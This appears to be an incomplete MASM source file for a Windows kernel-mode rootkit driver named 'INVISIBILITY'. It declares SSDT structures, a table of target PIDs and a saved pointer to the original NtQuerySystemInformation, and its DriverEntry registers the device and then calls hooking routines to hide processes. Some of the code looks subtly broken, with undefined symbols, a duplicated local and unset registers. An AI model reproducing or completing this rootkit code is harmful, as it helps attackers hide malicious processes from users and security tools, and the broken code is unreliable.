.386
.model flat, stdcall
option casemap:none

;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;                                  I N C L U D E   F I L E S                                        
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

include \masm32\include\windows.inc

include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\advapi32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\advapi32.lib

include \masm32\include\winioctl.inc

include \masm32\modules\macros.inc
include string.inc
include ntstruc.inc
include ntddk.inc
include ntoskrnl.inc
include NtDll.inc
include IoCtrl.inc

includelib wdm.lib
includelib ntoskrnl.lib
includelib ntdll.lib


; structure one can find at ntoskrnl!KeServiceDescriptorTable and at 'KeServiceDescriptorTableShadow'
SSDT struct
	pSSAT              LPVOID  ?      ; System Service Address Table   ( LPVOID[] )
	Obsolete           DWORD   ?      ; or maybe: API ID base
	dwAPICount         DWORD   ?
	pSSPT              LPVOID  ?      ; System Service Parameter Table ( BYTE[] )
SSDT ends

; structure being built by the PUSHAD instruction on the stack
PUSHA_STRUCT struct 1
	_EDI               DWORD ?
	_ESI               DWORD ?
	_EBP               DWORD ?
	_ESP               DWORD ?
	_EBX               DWORD ?
	_EDX               DWORD ?
	_ECX               DWORD ?
	_EAX               DWORD ?
PUSHA_STRUCT ends

;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;                                     C O N S T A N T S                                             
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

.const

;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;                              I N I T I A L I Z E D  D A T A                                       
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

.data

;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;                              U N I N I T I A L I Z E D  D A T A                                   
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

.data?

;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;                                       C O D E                                                     
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

.code
TEXTW szDevPath,           <\Device\INVISIBILITY/0>
TEXTW szSymPath,           <\DosDevices\INVISIBILITY/0>
TablePresent                dd 0
PIDCount                    dd -1   ; nombre de PIDS à vérifier
pPIDTable                   dd -1   ; pointeur vers la table de words contenant les pIDS
IsHooked                    dd 0
pDevObj                     PDEVICE_OBJECT 0
pNQSI                       dd -1                                              ; ptr 2 ntdll!NtQuerySystemInformation
;pEW                        dd -1                                              ; ptr 2 user32!EnumWindows
dwTargetPID                 dd -1
dwNQSI_NT_ID                dd -1
pOldNtOsNQSI                dd  0
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
;                                       start                                                       
;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

DriverEntry proc uses ebx esi edi, DriverObject, RegPath
LOCAL   DeviceName      : UNICODE_STRING
LOCAL   SymbolicLinkName: UNICODE_STRING
LOCAL   DeviceObject:DWORD
LOCAL   DriverObject:DWORD


         invoke RtlInitUnicodeString,addr DeviceName,addr szDevPath

         mov     ebx,DriverObject                    ; DRIVER_OBJECT
         lea     eax,DeviceObject                    ; DEVICE_OBJECT

         push    eax                  ;DeviceObject
         push    0                    ;Exclusive
         push    0                    ;DeviceCharacteristics
         lea     eax,[ebp+DeviceName]
         push    22h                  ;DeviceType FILE_DEVICE_UNKNOWN
         push    eax                  ;DeviceName
         push    0                    ;DeviceExtensionSize
         push    ebx                  ;pDriverObject
         iWin32  IoCreateDevice
         test    eax,eax
         jnz     Exit_on_failed_creation

         lea     eax, [ebp+SymbolicLinkName] ; SymbolicLinkName
         push    offset Device_type
         push    eax
         call    esi ; RtlInitUnicodeString

         lea     eax, [ebp+DeviceName]
         push    eax
         lea     eax, [ebp+SymbolicLinkName]
         push    eax
         iWin32  IoCreateSymbolicLink
         mov     esi, eax
         test    esi, esi
         jz      Symbolic_link_success

         push    [ebp+DeviceObject]
         iWin32  IoDeleteDevice

         mov     eax, esi
         jmp     Exit_on_failed_creation

Symbolic_link_success:

         mov     dword ptr [ebx+34h], offset UnloadDriver       ; DRIVER_OBJECT.PDRIVER_UNLOAD
         mov     dword ptr [ebx+38h], offset RequestHandler     ; DRIVER_OBJECT.PDISPATCH_IRP_MJ_CREATE
         mov     dword ptr [ebx+40h], offset RequestHandler     ; DRIVER_OBJECT.PDISPATCH_IRP_MJ_CLOSE
         mov     dword ptr [ebx+70h], offset ServiceHandler     ; DRIVER_OBJECT.PDISPATCH_IRP_MJ_DEVICE_CONTROL

         nop     ; << important!
         call    initmysys
         call    hookint1
         

Exit_on_failed_creation:

         pop     esi
         pop     ebx
         leave
         retn    8